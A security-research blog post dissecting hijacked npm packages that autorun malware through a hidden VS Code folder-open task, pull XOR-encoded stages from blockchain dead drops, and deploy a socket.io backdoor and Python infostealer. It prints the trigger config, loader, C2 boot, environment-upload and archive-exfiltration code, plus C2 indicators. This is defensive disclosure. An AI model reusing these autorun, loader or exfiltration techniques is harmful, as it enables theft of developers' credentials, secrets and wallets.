---
excerpt: "JFrog Security Research identified two hijacked npm packages, `html-to-gutenberg` and `fetch-pacage-assets`, that used a hidden VS Code task to launch a multi-stage malware chain. The payloads used blockchain transaction data as dead drops, installed JavaScript and Python runtime components, and deployed a backdoor and infostealer targeting credentials, browsers, wallets, developer tools, and environment secrets."
title: "Hijacked npm Packages Use Novel VSCode Autorun and Blockchain Dead Drops to Deploy a Credential/Crypto Stealer"
date: "June 24, 2026"
description: "Guy Korolevski and Yair Benamou, JFrog Security Researchers"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/vscode-blockchain-npm/image1.png
type: realTimePost
minutes: '10'
---

![](/img/RealTimePostImage/post/vscode-blockchain-npm/image1.png)

**Update 25/06/2026** - Following our report, [Nextron Research](https://x.com/nextronresearch/status/2069802303817679083) identified an additional 16 Go packages containing the same malware. Most appear to be legitimate packages whose latest released version included the malware alongside the original package contents, using the same structure and fake font file. The full list is available in the [Go packages identified containing the same malicious payload](#go-packages-identified-containing-the-same-malicious-payload) section below. Some of the malicious packages are still live, even years after their commit timestamp.


The JFrog Security Research team identified two hijacked npm packages, `html-to-gutenberg` version `4.2.11` and `fetch-page-assets` version `1.2.9`, that used the same unusual execution technique. Both malicious versions have since been removed from npm, but we were able to recover the full payload chain and analyze all stages. Note that `fetch-page-assets` has `html-to-gutenberg` as a dependency, but contains the malware itself as well.

The versions were uploaded to NPM during 25/05/2026, about a month ago. While the compromised versions are no longer available to download via NPM, the attacker’s infrastructure remains active, enabling the full analysis detailed here.

This attack avoids the most common npm execution paths through lifecycle scripts, perhaps in an attempt to remain “compatible” with [npm v12’s security hardenings](https://jfrog.com/blog/npm-v12-from-implicit-to-explicit-trust/). **The package hides execution inside a VS Code task, configured to run automatically** when the project folder is opened in VS Code. From there, the malware retrieves encrypted JavaScript from blockchain transaction data, connects to attacker-controlled infrastructure, launches a socket.io backdoor, and eventually deploys a Python infostealer.  

![](/img/RealTimePostImage/post/vscode-blockchain-npm/image2.png)

## Hijacked Packages and Initial Trigger

The malicious version of  `html-to-gutenberg` preserved ordinary package metadata and legitimate-looking project files. Its malicious logic was hidden outside the normal npm entry point, under a fake font asset path. The execution trigger was a hidden VS Code task named `eslint-check`, configured with `runOn: "folderOpen"`.

```json
{
  "label": "eslint-check",
  "type": "shell",
  "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || ...",
  "hide": true,
  "presentation": {
    "reveal": "never",
    "echo": false,
    "close": true
  },
  "runOptions": {
    "runOn": "folderOpen"
  }
}
```

VS Code (and forks such as Cursor) can auto-run tasks that define `runOptions.runOn: "folderOpen"`, but only when that folder is opened as a workspace folder. They do not recursively execute every nested `.vscode/tasks.json`; in this case, the trigger fires when the malicious package directory itself is opened as the workspace and **marked as trusted**, or that the developer **explicitly allowed automatic tasks**. The command also disguises the payload as a font file \- `public/fonts/fa-solid-400.woff2`,  even though the file just contains JavaScript code.

## Stage 1 \- Fake Font Loader

The first JavaScript stage exposes Node internals globally, sets a victim/version marker, and retrieves **two encrypted payloads**. The marker from `html-to-gutenberg` is `_V = "A8-**"`, which later appears in the `Sec-V` HTTP header and affects C2 selection.

![](/img/RealTimePostImage/post/vscode-blockchain-npm/image3.png)

The “font” file contains 752 spaces characters before the payload, so when opened in an editor without text wrapping, it shows as if it was an empty file.

The loader uses public blockchain infrastructure as a **dead-drop** mechanism. It first tries to resolve a transaction hash through **TronGrid**, falls back to **Aptos** if needed, then queries BSC JSON-RPC and extracts data embedded after a `?.?` marker in the transaction input. The extracted payload is XOR-decoded and executed either inline with `eval` or in a detached `node -e` process.

```javascript
async function loadPayload(xorKey, tronAccount, aptosAccount) {
  let transactionHash = await resolveFromTron(tronAccount);
  if (!transactionHash) {
    transactionHash = await resolveFromAptos(aptosAccount);
  }

  const input = await getBscTransactionInput(transactionHash);
  const encrypted = Buffer.from(input.slice(2), "hex").toString("utf8").split("?.?")[1];
  return xorDecode(encrypted, xorKey);
}

const inlinePayload = await loadPayload("2[gWfGj;<:-93Z^C", tronAccount, aptosAccount);
eval(inlinePayload);
```

Using blockchain data in this way gives the attacker a resilient hosting layer for payload discovery. The executable code is not stored directly in the npm package, and the first-stage loader can recover new stages from transaction metadata as long as the referenced blockchain data and RPC services remain accessible. 

The services used here, including `api.trongrid.io`, `fullnode.mainnet.aptoslabs.com`, `bsc-dataseed.binance.org`, and `bsc-rpc.publicnode.com`, are legitimate public blockchain APIs and RPC endpoints being abused as payload dead drops.

## Stage 2 \- Boot Payload and C2 Selection

The next JavaScript stage repeats the same dead-drop retrieval pattern and initializes global C2 values used by later stages. A parallel detached Node payload chooses the HTTP base URL based on the victim marker and requests `/$/boot`, sending the marker in the `Sec-V` header.

```javascript
function selectBootBaseUrl(secV) {
  if (secV[0] === "A") {
    return "hxxp[:]//166[.]88[.]134[.]62";
  }

  return "hxxp[:]//198[.]105[.]127[.]210";
}

const response = await request(selectBootBaseUrl(global._V) + "/$/boot", {
  headers: { "Sec-V": global._V }
});

eval(xorDecode(response.body, "ThZG+0jfXE6VAGOJ"));
```

The C2 paths include bootstrapping endpoints, status reporting routes, file upload routes, and Python tooling downloads. The same C2 infrastructure later serves Python code through `/$/{id}` and receives stolen data through `/u/e` and `/u/f`.

## Stage 3 \- Socket.io Backdoor

One branch starts a C2 backdoor client, using the socket.io library for communications. After deobfuscating the embedded string table, we recovered command names, upload paths, registration fields, dependency names, and injection targets. The backdoor installs or loads `axios`, `form-data`, and `socket.io-client`, connects to attacker infrastructure, and registers the victim host with fields such as `clientUuid`, `processId`, `osType`, `VERSION`, `_V`, and timestamps.

```javascript
const socket = io(socketUrl, { reconnectionDelay: 5000 });

socket.on("connect", () => {
  socket.emit("identify", "client", {
    clientUuid: hostname,
    processId,
    osType,
    VERSION,
    _V: victimId,
    CURRENT_TIMESTAMP,
    FIRST_VISIT_TIME
  });
});

socket.on("command", enqueueCommand);
```

The command set gives the attacker broad control over the infected machine. It supports directory changes, shell execution, clipboard reads, public IP lookup, single-file upload, recursive directory upload, forced process exit, and arbitrary JavaScript execution through `ss_eval:` and `ss_eval64:`. A default execution path runs arbitrary shell commands with the current session directory and an environment containing the victim marker.

![](/img/RealTimePostImage/post/vscode-blockchain-npm/image4.png)

The string table also contains injection targets for developer and desktop applications, including **VS Code, Cursor, Antigravity, Discord, GitHub Desktop, and npm CLI paths**. This suggests the attacker intended not only to run an infostealer, but also to maintain or extend execution through trusted developer tools.

## Stage 4 \- Runtime Bootstrapper and Python Loader

Another branch acts as a runtime bootstrapper. It creates a user-level Node dependency directory under `~/.node_modules`, installs missing packages with npm, reports status to `/verify-human/{channel}`, uploads process environment variables to `/snv`, and launches additional detached Node processes.

```javascript
const moduleRoot = path.join(os.homedir(), ".node_modules");

if (!requireFromUserModules("axios")) {
  await exec(`npm --prefix "${moduleRoot}" install axios socket.io-client`);
}

await axios.post(c2 + "/snv", new URLSearchParams({
  id: `${hostname}$${username}`,
  user: username,
  body: JSON.stringify(filteredEnvironment)
}));
```

The same stage builds a compact Python loader. The loader requests `/$/{id}` from the attacker-controlled code server with the `Sec-V` header, then executes the returned Python source with `exec`. On Windows, if a suitable Python interpreter is missing, the malware downloads `python.zip`, `python.7z`, and `7zr.exe` from the attacker infrastructure into a Python-like directory under `%LOCALAPPDATA%`. On Linux and macOS, it may retrieve `get-pip.py` from PyPA if the Python stage reports missing dependencies; `bootstrap.pypa.io/get-pip.py` is a legitimate PyPA bootstrap script, but here it is used as part of the malicious runtime setup.

The bootstrapper also contains checks for cloud, CI, and sandbox-like environments, including references to AWS, Azure, GCP, Vercel, GitHub runner naming, Codespaces, devcontainers, Kali, and related indicators. When these checks match, the payload reports a blocked state instead of continuing with full behavior.

## Stage 5 \- Python Infostealer

The final Python stage is a broad credential, browser, wallet, and developer artifact stealer. The obfuscated wrapper uses reversed base64 and zlib compression, but the deobfuscated payload clearly shows cross-platform collection logic for Windows, macOS, and Linux.  
![](/img/RealTimePostImage/post/vscode-blockchain-npm/image5.png)

The payload targets Chromium-family browsers including Chrome, Chromium, Opera, Opera GX, Brave, Edge, Arc, Dia, Comet, and Vivaldi. It collects `Login Data`, `Web Data`, cookies, `Local State`, `Preferences`, and `Secure Preferences`, and attempts to decrypt passwords, cookies, and saved payment cards where platform keys are available. It also parses Firefox profile data, including `key4.db`, `logins.json`, and `cookies.sqlite`.  

![](/img/RealTimePostImage/post/vscode-blockchain-npm/image6.png) 

The extension collection logic covers password managers, authenticators, and cryptocurrency wallets. Representative targets include 1Password, LastPass, NordPass, RoboForm, Keeper, Proton Pass, Bitwarden, MetaMask, Phantom, TronLink, Trust Wallet, Binance, Coinbase, OKX, Rabby, Keplr, Xverse, Exodus, Safepal, Tonkeeper, Solflare, Zerion, Unisat, ArgentX, Braavos, Nami, Cosmostation, Frontier, Alby, TokenPocket, Lace, Bittensor, and Google Authenticator extension data.

The stealer also copies local wallet and developer application data. Targets include Exodus, Atomic, Electrum, Bitcoin, Dogecoin, Ledger Live, Trezor Suite, Monero, Solana keys, Git credentials, GitHub CLI `hosts.yml`, GitHub Desktop logs, VS Code global storage, Proxifier, WinAuth, Windows Credential Manager, Linux Secret Service, KDE Wallet, macOS keychain material, and cloud-storage folder metadata for Dropbox, Google Drive, OneDrive, iCloud, Box, Mega, and pCloud.

```py
environment = dict(os.environ)
write_json(os.path.join(staging_dir, "_sysenv.json"), environment)
write_env(os.path.join(staging_dir, "_sysenv.env"), environment)

archive_path = build_archive(staging_dir, host, user, timestamp)
http_upload(f"{target}/u/f", client_id, "_auto", [archive_path])

if telegram_token and telegram_target:
    telegram_upload(telegram_token, telegram_target, archive_path)
```

Collected data is staged under `%USERPROFILE%\.npm` on Windows or `/tmp/.npm` on Linux and macOS, packed into encrypted zip archives, uploaded to the HTTP C2, and optionally uploaded to Telegram. The Telegram bot token is not hardcoded in the payload; it is returned dynamically by the attacker's `/u/e` endpoint.

## Remediation

- Remove the malicious package versions if present: `npm uninstall html-to-gutenberg fetch-page-assets`.  
- Search developer workstations for hidden VS Code tasks using `runOn: "folderOpen"`, especially tasks that execute files under `public/fonts/` or paths resembling `fa-solid-400.woff2`.  
- Treat affected machines as fully compromised. Rotate npm tokens, GitHub tokens, SSH keys, cloud credentials, API keys, browser-stored credentials, password manager secrets, and cryptocurrency wallet credentials from a clean device.  
- Block traffic to `166[.]88[.]134[.]62`, `198[.]105[.]127[.]210`, and `23[.]27[.]202[.]27`, including requests to `/$/boot`, `/$/{id}`, `/verify-human/`, `/snv`, `/u/e`, `/u/f`, `/d/python.zip`, `/d/python.7z`, and `/d/7zr.exe`.  
- Remove runtime artifacts such as `~/.node_modules` created by the payload, `%LOCALAPPDATA%\Programs\Python\Python3127`, `/tmp/get-pip.py`, `/tmp/.npm`, and unexpected `.npm` archives named with `<hostname>$<username>`.  
- Reinstall or validate modified developer applications if injection is suspected, especially VS Code, Cursor, Antigravity, Discord, GitHub Desktop, and npm CLI files.

## Conclusions

This campaign combines a quiet editor-based execution trigger with a deep, staged payload chain. The use of VS Code folder-open tasks is particularly relevant for developer environments because it can execute when a project is opened, without depending on npm lifecycle scripts. The blockchain dead-drop layer further separates the malicious package from the later payloads, making the npm artifact look less complete during static inspection.

The payloads show that the attacker was interested in both immediate theft and interactive access. The socket.io-based backdoor provides command execution and file collection, while the Python stage performs wide credential and wallet harvesting across browsers, OS credential stores, developer tooling, and cryptocurrency applications.

These packages are already detected by JFrog Xray and JFrog Curation.

## IOCs

- `html-to-gutenberg` (npm) version `4.2.11` \- XRAY-1008590  
- `fetch-page-assets` (npm) version `1.2.9` \- XRAY-1008535  
- C2 IPs:   
  - `166[.]88[.]134[.]62`  
  - `198[.]105[.]127[.]210`  
  - `23[.]27[.]202[.]27`  
- C2 base URLs:  
  - `hxxp[:]//166[.]88[.]134[.]62`  
  - `hxxp[:]//166[.]88[.]134[.]62:443`  
  - `hxxp[:]//198[.]105[.]127[.]210`  
  - `hxxp[:]//198[.]105[.]127[.]210:443`  
  - `hxxp[:]//23[.]27[.]202[.]27:443`  
  - `hxxp[:]//23[.]27[.]202[.]27:27017`  
- C2 paths: `/$/boot`, `/$/{id}`, `/verify-human/{channel}`, `/snv`, `/u/e`, `/u/f`, `/d/python.zip`, `/d/python.7z`, `/d/7zr.exe`  
- Legitimate services abused by the malware: `api[.]trongrid[.]io`, `fullnode[.]mainnet[.]aptoslabs[.]com`, `bsc-dataseed[.]binance[.]org`, `bsc-rpc[.]publicnode[.]com`, `bootstrap[.]pypa[.]io/get-pip.py`  
- BSC JSON-RPC method: `eth_getTransactionByHash`  
- Tron accounts:  
  - `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`  
  - `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`  
  - `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v`  
- Aptos accounts:  
  - `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`  
  - `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`  
  - `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1`  
- Telegram upload endpoint pattern: `hxxps[:]//api[.]telegram[.]org/bot{telegram_bot_token}/sendDocument`  
- Observed Telegram bot token prefix: `7870147428:AAGbYG...`  
- Observed Telegram upload target: `7699029999`  
- Host artifact: `.vscode/tasks.json` with `runOn: "folderOpen"`  
- Runtime artifacts:  
  -  `~/.node_modules`  
  - `%LOCALAPPDATA%\Programs\Python\Python3127`  
  - `%LOCALAPPDATA%\Programs\Python\Python3127\python.exe`  
  - `%LOCALAPPDATA%\Programs\Python\Python3127\python.zip`  
  - `%LOCALAPPDATA%\Programs\Python\Python3127\7zr.exe`  
  - `%LOCALAPPDATA%\Programs\Python\Python3127\python.7z`  
  - `/tmp/get-pip.py`  
  - `%USERPROFILE%\.npm`  
  - `/tmp/.npm`

## Go packages identified containing the same malicious payload

| Package | Xray ID | Versions |
| :---- | :---- | :---- |
| github[.]com/Barsu5489/commerce | XRAY-1009784 | v0.0.0-20231123164829-2eb351369e57 |
| github[.]com/Setsu548/Logistic | XRAY-1009796 | v0.0.0-20240410002038-5b40bed74f90 |
| github[.]com/amantsehay/a2sv-go-course | XRAY-1009780 | v0.0.0-20240816090215-c51e2d9214d5 |
| github[.]com/anatoli-derese/a2sv-excercise | XRAY-1009791 | v0.0.0-20240805074755-5adbbc600635 |
| github[.]com/bm-197/chill | XRAY-1009782 | v0.0.0-20241216030053-8573b6044fba |
| github[.]com/dexbotsdev/uniswap-v2-v3-arbitrage | XRAY-1009790 | v0.0.0-20231007040503-7b0a4d1c503d |
| github[.]com/glacialspring/go-winsparkle | XRAY-1009789 | v0.0.0-20250402002608-ba5501b8ba90 |
| github[.]com/glacialspring/static | XRAY-1009786 | v0.0.0-20181015024211-023dc73bc332 |
| github[.]com/hngi/Team-Fierce-Backend-Golang | XRAY-1009779 | v0.0.0-20200612135333-4f82269a0a14 |
| github[.]com/lambda-platform/dan | XRAY-1009785 | v0.0.0-20221011015638-695b34fb98d4 |
| github[.]com/lambda-platform/ebarimt-rest-api | XRAY-1009795 | v0.0.0-20230429075241-30dbb04b67f7 |
| github[.]com/lambda-platform/lambda | XRAY-1009794 | v0.9.19-0.20260525032942-0cf995e71697,v0.9.20-0.20260619012358-12b5a6e0c244 |
| github[.]com/naol7/dist-task-scheduler | XRAY-1009781 | v0.0.0-20241120175214-0365b36af82f |
| github[.]com/reauheau/goaubio | XRAY-1009787 | v0.0.0-20260213144826-0c7c4a5b5859 |
| github[.]com/rickt/slack-weather-bot | XRAY-1009788 | v0.0.0-20180704165649-55def291ce83 |
| github[.]com/zainirfan13/graphql-client | XRAY-1009783 | v0.0.0-20220912215956-d304e79da123 |